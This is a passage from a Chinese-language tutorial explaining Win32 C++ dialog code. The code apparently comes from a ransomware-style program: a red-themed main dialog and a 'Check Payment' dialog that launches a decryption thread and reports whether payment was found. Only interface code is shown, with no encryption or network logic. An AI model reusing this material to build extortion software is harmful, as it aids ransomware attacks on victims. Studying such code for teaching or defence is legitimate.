* 第774到第783行，接收檔名，並紀錄接收檔名數量，並利用SendMessage將檔名傳送給ListBox。
```cpp=787
        case IDC_DECQUEUE_DONE:
        {
            EnableWindow(hWndStart, TRUE);
            break;
        }
        default:
            break;
        }
        break;
    }
    case WM_CTLCOLORDLG:
        return (INT_PTR)hBkBrush;
    case WM_CTLCOLORSTATIC:
    {
        HDC hdcStatic = (HDC)wParam;
        HWND hWndStatic = (HWND)lParam;
        SetBkColor(hdcStatic, RGB(128, 0, 0));
        SetTextColor(hdcStatic, RGB(255, 255, 255));
        return (INT_PTR)((HBRUSH)GetStockObject(NULL_BRUSH));
    }
    case WM_CLOSE:
        DeleteObject(hBkBrush);
        DeleteObject(hFont);
        EndDialog(hDlg, LOWORD(wParam));
        return (INT_PTR)TRUE;
    }
    return (INT_PTR)FALSE;
}
```
* 第797及第798行，將背景設為紅色，故回傳紅色筆刷
* 第799到第805行，所有控制元件都設定為白色文字，回傳NULL_BRUSH，即透明元件。
```cpp=815
// Message handler for Check Payment Dialog.
INT_PTR CALLBACK CheckPaymentDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    static HWND hWndPB = NULL;
    static ULONG nMsgID = IDS_CHECKPAYMENTFAIL;
    switch (message)
    {
    case WM_INITDIALOG:
    {
        hWndPB = GetDlgItem(hDlg,
            IDC_CHECKPAYMENTPROGRESS);
        SendMessage(hWndPB,
            PBM_SETRANGE, 0, MAKELPARAM(1, 254));
        SendMessage(hWndPB,
            PBM_SETSTEP, (WPARAM)1, 0);
        HANDLE hThread = CreateThread(
            NULL,
            0,
            DecryptClientThread,
            hDlg,
            0,
            NULL);
        if (hThread) {
            CloseHandle(hThread);
            hThread = NULL;
        }       return (INT_PTR)TRUE;
    }
    case WM_COMMAND:
    {
        int wmId = LOWORD(wParam);
        // Parse the menu selections:
        switch (wmId)
        {
        case IDC_CANCEL_BUTTON:
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    case WM_USER:
        switch (wParam) {
        case IDC_SCAN_SERVER:
            SendMessage(hWndPB,
                PBM_SETPOS, (WPARAM)lParam, 0);
            return (INT_PTR)TRUE;
        case IDC_SCAN_FOUND:
            nMsgID = IDS_CHECKPAYMENTOK;
            return (INT_PTR)TRUE;
        case IDC_SCAN_DONE:
        {
            TCHAR szMsg[MAX_LOADSTRING] = _T("");
            LoadString(hInst, nMsgID, szMsg, MAX_LOADSTRING);
            MessageBox(hDlg, szMsg, _T("Message"), MB_OK);
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        default:
            break;
        }
        
    case WM_CLOSE:
        EndDialog(hDlg, LOWORD(wParam));
        return (INT_PTR)TRUE;
    }
    return (INT_PTR)FALSE;
}

```